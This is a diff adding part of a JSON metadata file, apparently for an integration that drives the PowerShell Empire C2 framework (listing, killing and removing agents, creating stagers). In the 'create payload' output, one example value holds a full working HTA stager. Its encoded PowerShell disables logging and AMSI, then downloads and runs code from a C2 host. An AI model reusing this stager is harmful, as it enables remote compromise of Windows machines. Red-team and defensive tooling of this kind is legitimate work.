+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.summary.AgentName",
+                    "data_type": "string",
+                    "example_values": [
+                        "CNEVH5SZ"
+                    ],
+                    "contains": [
+                        "empire agent name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.summary.AgentResults",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                }
+            ],
+            "render": {
+                "type": "table"
+            },
+            "versions": "EQ(*)"
+        },
+        {
+            "action": "terminate server",
+            "identifier": "kill_listener",
+            "description": "Kill a listener in Empire",
+            "verbose": "This terminates the listener(s) on the empire server.",
+            "type": "generic",
+            "read_only": false,
+            "parameters": {
+                "listener_name": {
+                    "description": "Listener name to kill",
+                    "data_type": "string",
+                    "required": false,
+                    "primary": true,
+                    "contains": [
+                        "empire listener name"
+                    ],
+                    "order": 0
+                },
+                "kill_all": {
+                    "description": "Kill all listeners?",
+                    "data_type": "boolean",
+                    "required": true,
+                    "primary": false,
+                    "default": false,
+                    "order": 1
+                }
+            },
+            "output": [
+                {
+                    "data_path": "action_result.status",
+                    "data_type": "string",
+                    "example_values": [
+                        "success"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.success",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.message",
+                    "data_type": "string",
+                    "example_values": [
+                        "Success: True"
+                    ]
+                },
+                {
+                    "data_path": "action_result.parameter.kill_all",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.parameter.listener_name",
+                    "data_type": "string",
+                    "example_values": [
+                        "bob_test"
+                    ],
+                    "contains": [
+                        "empire listener name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.summary.success",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects_successful",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                }
+            ],
+            "render": {
+                "type": "table"
+            },
+            "versions": "EQ(*)"
+        },
+        {
+            "action": "terminate endpoint",
+            "identifier": "kill_agent",
+            "description": "Kill an agent on an endpoint in Empire",
+            "verbose": "This instructs the process on the remote machine to terminate.",
+            "type": "generic",
+            "read_only": false,
+            "parameters": {
+                "agent_name": {
+                    "description": "Agent name to kill",
+                    "data_type": "string",
+                    "required": false,
+                    "primary": true,
+                    "contains": [
+                        "empire agent name"
+                    ],
+                    "value_list": [],
+                    "default": "",
+                    "order": 0
+                },
+                "kill_all": {
+                    "description": "Kill all agents?",
+                    "data_type": "boolean",
+                    "required": true,
+                    "primary": false,
+                    "default": false,
+                    "order": 2
+                }
+            },
+            "output": [
+                {
+                    "data_path": "action_result.parameter.agent_name",
+                    "data_type": "string",
+                    "contains": [
+                        "empire agent name"
+                    ],
+                    "column_name": "Agent Name",
+                    "column_order": 0,
+                    "example_values": [
+                        "CNEVH5SZ"
+                    ]
+                },
+                {
+                    "data_path": "action_result.status",
+                    "data_type": "string",
+                    "column_name": "Status",
+                    "column_order": 1,
+                    "example_values": [
+                        "success"
+                    ]
+                },
+                {
+                    "data_path": "action_result.message",
+                    "data_type": "string",
+                    "example_values": [
+                        "Success: True"
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects_successful",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.success",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.parameter.kill_all",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.summary.success",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                }
+            ],
+            "render": {
+                "type": "table"
+            },
+            "versions": "EQ(*)"
+        },
+        {
+            "action": "remove endpoint",
+            "identifier": "remove_agent",
+            "description": "Remove an agent in Empire",
+            "verbose": "This removes an agent from the Empire server database.  It is usually best to kill agent first.",
+            "type": "generic",
+            "read_only": false,
+            "parameters": {
+                "agent_name": {
+                    "description": "Agent name to remove",
+                    "data_type": "string",
+                    "required": false,
+                    "primary": true,
+                    "contains": [
+                        "empire agent name"
+                    ],
+                    "value_list": [],
+                    "default": "",
+                    "order": 0
+                },
+                "remove_stale": {
+                    "description": "Remove all stale agents?",
+                    "data_type": "boolean",
+                    "required": true,
+                    "primary": false,
+                    "default": false,
+                    "order": 2
+                }
+            },
+            "output": [
+                {
+                    "data_path": "action_result.status",
+                    "data_type": "string",
+                    "example_values": [
+                        "success"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.success",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.message",
+                    "data_type": "string",
+                    "example_values": [
+                        "Success: True"
+                    ]
+                },
+                {
+                    "data_path": "action_result.parameter.agent_name",
+                    "data_type": "string",
+                    "example_values": [
+                        "ZU2S9D3A"
+                    ],
+                    "contains": [
+                        "empire agent name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.parameter.remove_stale",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.summary.success",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects_successful",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                }
+            ],
+            "render": {
+                "type": "table"
+            },
+            "versions": "EQ(*)"
+        },
+        {
+            "action": "list endpoints",
+            "identifier": "list_agents",
+            "description": "Returns all current agents in Empire",
+            "verbose": "",
+            "type": "generic",
+            "read_only": true,
+            "parameters": {
+                "stale_only": {
+                    "description": "Return only stale agents?",
+                    "data_type": "boolean",
+                    "required": true,
+                    "default": false,
+                    "order": 1
+                }
+            },
+            "output": [
+                {
+                    "data_path": "action_result.status",
+                    "data_type": "string",
+                    "column_name": "Status",
+                    "example_values": [
+                        "success"
+                    ]
+                },
+                {
+                    "data_path": "action_result.message",
+                    "data_type": "string",
+                    "example_values": [
+                        "Total agents: 1"
+                    ]
+                },
+                {
+                    "data_path": "action_result.parameter.stale_only",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects_successful",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.nonce",
+                    "data_type": "string",
+                    "example_values": [
+                        "7329946792862812"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.working_hours",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.results",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.internal_ip",
+                    "data_type": "string",
+                    "example_values": [
+                        "172.16.25.128"
+                    ],
+                    "contains": [
+                        "ip"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.jitter",
+                    "data_type": "numeric",
+                    "example_values": [
+                        0
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.session_key",
+                    "data_type": "string",
+                    "example_values": [
+                        "=,NKlX|d1%j[P}n\\0CurmDF5fMJ>{U*8"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.checkin_time",
+                    "data_type": "string",
+                    "example_values": [
+                        "2017-11-16 09:05:28"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.hostname",
+                    "data_type": "string",
+                    "column_order": 4,
+                    "column_name": "Hostname",
+                    "example_values": [
+                        "WIN-1DOIUPRU4D8"
+                    ],
+                    "contains": [
+                        "host name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.delay",
+                    "data_type": "numeric",
+                    "example_values": [
+                        5
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.profile",
+                    "data_type": "string",
+                    "example_values": [
+                        "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.kill_date",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.process_name",
+                    "data_type": "string",
+                    "example_values": [
+                        "powershell"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.listener",
+                    "data_type": "string",
+                    "example_values": [
+                        "http"
+                    ],
+                    "contains": [
+                        "empire listener name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.process_id",
+                    "data_type": "string",
+                    "example_values": [
+                        "2068"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.os_details",
+                    "data_type": "string",
+                    "example_values": [
+                        "Microsoft Windows 7 Ultimate "
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.lost_limit",
+                    "data_type": "numeric",
+                    "example_values": [
+                        60
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.ID",
+                    "data_type": "numeric",
+                    "example_values": [
+                        4
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.taskings",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.name",
+                    "data_type": "string",
+                    "column_order": 0,
+                    "column_name": "Agent Name",
+                    "example_values": [
+                        "2W3DPAXB"
+                    ],
+                    "contains": [
+                        "empire agent name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.language",
+                    "data_type": "string",
+                    "column_order": 1,
+                    "column_name": "Language",
+                    "example_values": [
+                        "powershell"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.external_ip",
+                    "data_type": "string",
+                    "example_values": [
+                        "172.16.25.128"
+                    ],
+                    "column_order": 5,
+                    "column_name": "External IP",
+                    "contains": [
+                        "ip"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.session_id",
+                    "data_type": "string",
+                    "example_values": [
+                        "2W3DPAXB"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.username",
+                    "data_type": "string",
+                    "example_values": [
+                        "WIN-1DOIUPRU4D8\\Herman"
+                    ],
+                    "column_order": 2,
+                    "column_name": "Username",
+                    "contains": [
+                        "user name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.lastseen_time",
+                    "data_type": "string",
+                    "example_values": [
+                        "2017-11-17 17:30:47"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.language_version",
+                    "data_type": "string",
+                    "example_values": [
+                        "4"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.agents.*.high_integrity",
+                    "data_type": "numeric",
+                    "column_order": 3,
+                    "column_name": "High Integrity",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "action_result.summary.total_agents",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                }
+            ],
+            "render": {
+                "type": "table"
+            },
+            "versions": "EQ(*)"
+        },
+        {
+            "action": "create payload",
+            "identifier": "create_stager",
+            "description": "Create a stager in Empire",
+            "verbose": "",
+            "type": "generic",
+            "read_only": false,
+            "parameters": {
+                "stager_name": {
+                    "description": "The stager name to generate",
+                    "data_type": "string",
+                    "required": true,
+                    "primary": false,
+                    "contains": [
+                        "empire stager name"
+                    ],
+                    "value_list": [],
+                    "default": "",
+                    "order": 0
+                },
+                "listener_name": {
+                    "description": "The listener name to generate stager for",
+                    "data_type": "string",
+                    "required": true,
+                    "primary": false,
+                    "contains": [
+                        "empire listener name"
+                    ],
+                    "value_list": [],
+                    "default": "",
+                    "order": 1
+                },
+                "options": {
+                    "description": "JSON of options for stager",
+                    "data_type": "string",
+                    "required": false,
+                    "primary": false,
+                    "value_list": [],
+                    "default": "",
+                    "order": 2
+                }
+            },
+            "output": [
+                {
+                    "data_path": "action_result.parameter.stager_name",
+                    "data_type": "string",
+                    "column_name": "Stager Name",
+                    "column_order": 0,
+                    "example_values": [
+                        "windows/hta"
+                    ],
+                    "contains": [
+                        "empire stager name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.parameter.listener_name",
+                    "data_type": "string",
+                    "contains": [
+                        "empire listener name"
+                    ],
+                    "column_name": "Listener Name",
+                    "column_order": 1,
+                    "example_values": [
+                        "http"
+                    ]
+                },
+                {
+                    "data_path": "action_result.parameter.options",
+                    "data_type": "string",
+                    "column_name": "Options",
+                    "column_order": 2
+                },
+                {
+                    "data_path": "action_result.status",
+                    "data_type": "string",
+                    "column_name": "Status",
+                    "column_order": 3,
+                    "example_values": [
+                        "success"
+                    ]
+                },
+                {
+                    "data_path": "action_result.message",
+                    "data_type": "string",
+                    "example_values": [
+                        "Stagercreated: True"
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects_successful",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.ProxyCreds.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.ProxyCreds.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Proxy credentials ([domain\\]username:password) to use for request (default, none, or other)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.ProxyCreds.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "default"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.Language.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.Language.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Language of the stager to generate."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.Language.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "powershell"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.Base64.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.Base64.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Switch. Base64 encode the output."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.Base64.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "True"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.StagerRetries.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.StagerRetries.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Times for the stager to retry connecting."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.StagerRetries.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "0"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.Listener.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.Listener.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Listener to generate stager for."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.Listener.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "http"
+                    ],
+                    "contains": [
+                        "empire listener name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.OutFile.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.OutFile.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "File to output HTA to, otherwise displayed on the screen."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.OutFile.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.Obfuscate.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.Obfuscate.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.Obfuscate.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "False"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.Proxy.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.Proxy.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Proxy to use for request (default, none, or other)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.Proxy.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "default"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.Output",
+                    "data_type": "string",
+                    "example_values": [
+                        "<html><head><script>var c= 'powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAFIAUwBJAG8ATgBUAGEAYgBMAGUALgBQAFMAVgBlAFIAUwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0AZwBlACAAMwApAHsAJABHAFAAUwA9AFsAUgBFAGYAXQAuAEEAUwBzAGUATQBCAGwAeQAuAEcARQB0AFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4ARwBFAFQAVgBBAEwAdQBlACgAJABOAHUATABsACkAOwBJAGYAKAAkAEcAUABTAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAA7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0ARQBMAHMAZQB7AFsAUwBjAHIAaQBwAFQAQgBMAE8AQwBrAF0ALgAiAEcAZQB0AEYAaQBlAGAAbABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAGEATABVAEUAKAAkAG4AdQBMAGwALAAoAE4ARQBXAC0ATwBCAEoAZQBjAHQAIABDAG8AbABMAGUAQwBUAEkATwBOAFMALgBHAEUAbgBlAHIASQBDAC4ASABhAFMASABTAGUAdABbAFMAdABSAEkAbgBnAF0AKQApAH0AWwBSAGUARgBdAC4AQQBzAHMARQBtAGIATABZAC4ARwBFAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAEkAZQBMAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQBUAFYAYQBsAHUARQAoACQAbgBVAEwAbAAsACQAVABSAHUAZQApAH0AOwB9ADsAWwBTAHkAcwB0AEUATQAuAE4AZQB0AC4AUwBlAHIAVgBJAEMAZQBQAE8ASQBOAFQATQBBAE4AQQBHAGUAcgBdADoAOgBFAFgAcABlAGMAVAAxADAAMABDAG8ATgB0AGkATgBVAGUAPQAwADsAJABXAEMAPQBOAEUAdwAtAE8AQgBKAGUAYwBUACAAUwB5AFMAdABlAE0ALgBOAEUAVAAuAFcARQBiAEMAbABJAEUATgB0ADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAdwBDAC4ASABFAEEAZABFAFIAcwAuAEEARABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBjAC4AUABSAG8AeAB5AD0AWwBTAHkAUwBUAGUAbQAuAE4AZQBUAC4AVwBlAGIAUgBlAFEAdQBFAFMAdABdADoAOgBEAGUARgBhAFUATAB0AFcAZQBCAFAAUgBvAHgAWQA7ACQAdwBDAC4AUAByAE8AWABZAC4AQwBSAGUAZABFAE4AVABJAEEAbABTACAAPQAgAFsAUwB5AFMAVABlAG0ALgBOAGUAVAAuAEMAUgBFAEQAZQBuAHQASQBhAEwAQwBhAEMASABlAF0AOgA6AEQARQBmAGEAVQBMAHQATgBFAFQAdwBPAFIAawBDAFIARQBkAEUATgBUAEkAQQBsAFMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAUwB0AEUATQAuAFQARQB4AFQALgBFAG4AYwBvAGQAaQBOAEcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgBZAHQAZQBzACgAJwA/ADcAbgBhAFMASABzAEsAewA7AGcAbwBwAEwAVgBtAEEAUgAsADkAbABeAF0AKwAqAGgAegApAHEALwA9AHYAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAUgBnAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACcAaAB0AHQAcAA6AC8ALwAxADcAMgAuADEANgAuADIANQAuADEANQA4ADoAOAAwADgAMAAnADsAJAB0AD0AJwAvAGEAZABtAGkAbgAvAGcAZQB0AC4AcABoAHAAJwA7ACQAVwBDAC4ASABlAGEAZABFAFIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AQwB5AGwAVQAyAGMARwBrAEkAYwAxAEkASQBmADgAcQBrAGoANgBEAHMAcgBjAEUAUAArAFkAPQAiACkAOwAkAEQAQQBUAEEAPQAkAFcAQwAuAEQAbwB3AE4ATABvAGEARABEAGEAVABhACgAJABzAEUAUgArACQAVAApADsAJABpAHYAPQAkAEQAYQB0AGEAWwAwAC4ALgAzAF0AOwAkAEQAYQBUAEEAPQAkAGQAQQB0AGEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUATgBnAHQASABdADsALQBqAG8AaQBuAFsAQwBoAEEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA=='\nnew ActiveXObject('WScript.Shell').Run(c);</script></head><body><script>self.close();</script></body></html>"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.UserAgent.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.UserAgent.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "User-agent string to use for the staging request (default, none, or other)."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.UserAgent.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "default"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.ObfuscateCommand.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.ObfuscateCommand.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.windows/hta.ObfuscateCommand.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        "Token\\All\\1,Launcher\\STDIN++\\12467"
+                    ]
+                },
+                {
+                    "data_path": "action_result.summary.StagerCreated",
+                    "data_type": "string",
+                    "example_values": [
+                        "True"
+                    ]
+                }
+            ],
+            "render": {
+                "type": "table"
+            },
+            "versions": "EQ(*)"
+        },
+        {
+            "action": "get payload",
+            "identifier": "get_stager",
+            "description": "Get a stager by name",
+            "verbose": "Get a single stager using its name.",
+            "type": "generic",
+            "read_only": true,
+            "parameters": {
+                "stager_name": {
+                    "description": "Name of stager to get",
+                    "data_type": "string",
+                    "required": true,
+                    "primary": true,
+                    "contains": [
+                        "empire stager name"
+                    ],
+                    "value_list": [],
+                    "default": "",
+                    "order": 0
+                }
+            },
+            "output": [
+                {
+                    "data_path": "action_result.parameter.stager_name",
+                    "data_type": "string",
+                    "contains": [
+                        "empire stager name"
+                    ],
+                    "column_name": "Stager Name",
+                    "column_order": 0,
+                    "example_values": [
+                        "osx/macro"
+                    ]
+                },
+                {
+                    "data_path": "action_result.status",
+                    "data_type": "string",
+                    "column_name": "Status",
+                    "column_order": 1,
+                    "example_values": [
+                        "success"
+                    ]
+                },
+                {
+                    "data_path": "action_result.message",
+                    "data_type": "string",
+                    "example_values": [
+                        "Total stagers: 1"
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "summary.total_objects_successful",
+                    "data_type": "numeric",
+                    "example_values": [
+                        1
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.Name",
+                    "data_type": "string",
+                    "example_values": [
+                        "osx/macro"
+                    ],
+                    "contains": [
+                        "empire stager name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.Author",
+                    "data_type": "string",
+                    "example_values": [
+                        "@herman"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "An OSX office macro."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.Comments",
+                    "data_type": "string",
+                    "example_values": [
+                        "http://stackoverflow.com/questions/6136798/vba-shell-function-in-office-2011-for-mac"
+                    ],
+                    "contains": [
+                        "url"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Listener.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Listener.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "Listener to generate stager for."
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.Listener.Value",
+                    "data_type": "string",
+                    "example_values": [
+                        ""
+                    ],
+                    "contains": [
+                        "empire listener name"
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.OutFile.Required",
+                    "data_type": "boolean",
+                    "example_values": [
+                        true,
+                        false
+                    ]
+                },
+                {
+                    "data_path": "action_result.data.*.stagers.*.options.OutFile.Description",
+                    "data_type": "string",
+                    "example_values": [
+                        "File to output AppleScript to, otherwise displayed on the screen."
+                    ]
+                },
+                {
